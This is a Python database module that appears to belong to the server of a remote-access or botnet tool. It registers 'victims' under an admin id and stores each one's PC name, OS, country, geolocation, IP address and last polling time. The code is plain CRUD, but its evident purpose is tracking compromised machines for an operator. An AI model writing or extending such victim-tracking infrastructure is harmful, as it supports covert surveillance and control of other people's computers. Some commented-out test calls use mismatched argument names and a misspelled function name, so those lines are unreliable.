import datetime
import time

from sqlalchemy.orm import Session

from server.models import Victim_DB
from server import pydantic_models
from server.CRUD.security import hash_victim_id


def register_victim(db: Session, pdm_victim: pydantic_models.RegisterVictim):
    """the function adds a new victim-user to the database"""
    new_victim = Victim_DB(pc_name=pdm_victim.pc_name,
                           id_admin=pdm_victim.id_admin,
                           os_name=pdm_victim.os_name
                           )
    db.add(new_victim)
    db.commit()
    __update_victim_hash_id(db=db, _id=new_victim.id_victim)
    db.refresh(new_victim)
    return new_victim


def __update_victim_hash_id(db: Session, _id: int):
    hashed_id = hash_victim_id(_id)
    data_vicitm = db.query(Victim_DB).filter(Victim_DB.id_victim == _id).update({"victim_hash_id": hashed_id},
                                                                                synchronize_session=False)
    db.commit()
    return hashed_id


def update_data_victim(db: Session, pdm_victim: pydantic_models.UpdateDataVictim):
    """the function updates data about the victim-user
    such as:
    -country
    -geolocation
    -ip address of the victim-user"""

    data_victim = db.query(Victim_DB).filter(Victim_DB.victim_hash_id == pdm_victim.victim_hash_id).update(dict(pdm_victim),
                                                                                                           synchronize_session=False)
    db.commit()
    return data_victim


def set_login_date(db: Session, pdm_victim):
    """the function updates data about the time of the last request of the victim-user"""
    data_victim = db.query(Victim_DB).filter(Victim_DB.victim_hash_id == pdm_victim.victim_hash_id).update(
        {"last_login_date": datetime.datetime.now().strftime("%Y:%m:%d:%H:%M:%s"),
         "last_login_time": str(time.time())}, synchronize_session=False)
    db.commit()
    return data_victim


def get_victim_hash_id(db: Session, pdm_victim: pydantic_models.LongpoolVictim):
    victim = db.query(Victim_DB).filter(Victim_DB.victim_hash_id == pdm_victim.victim_hash_id)
    return victim.scalar()


if __name__ == '__main__':
    from sqlalchemy import create_engine
    from sqlalchemy.orm.decl_api import declarative_base
    from sqlalchemy.orm import sessionmaker
    from os import environ
    from server.config import start

    start()

    DATABASE_URL = environ.get("DB_URL")

    # TODO change echo value to True
    engine = create_engine(DATABASE_URL, echo="debug")
    Base = declarative_base()
    Base.metadata.create_all(engine)

    SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
    with Session(autoflush=False, bind=engine) as db:
        # new_victim = pydantic_models.RegisterVictim(pc_name="evg",
        #                                             id_admin=228,
        #                                             os_name="win10")
        # register_victim(db=db, victim=new_victim)
        #
        # data_victim = pydantic_models.UpdateDataVictim(victim_hash_id="2b57bf7664a4de943d93e4f5473a42da0d7a35065afd559303196fcc33414e73a91042f8d238fcaca45a93b17e577ad15191f95c6d7cf7c19e240a1e05100ad6",
        #                                                country="USA",
        #                                                geolocation="1234569875|34567",
        #                                                victim_ip="127.0.0.1")
        # update_data_victim(db=db, victim=data_victim)
        # set_login_date(db=db, victim=pydantic_models.LoginVictim(victim_hash_id="2b57bf7664a4de943d93e4f5473a42da0d7a35065afd559303196fcc33414e73a91042f8d238fcaca45a93b17e577ad15191f95c6d7cf7c19e240a1e05100ad6"))
        # get_victm_hash_id(db=db, victim=pydantic_models.LoginVictim(victim_hash_id="2b57bf7664a4de943d93e4f5473a42da0d7a35065afd559303196fcc33414e73a91042f8d238fcaca45a93b17e577ad15191f95c6d7cf7c19e240a1e05100ad6"))
        pass
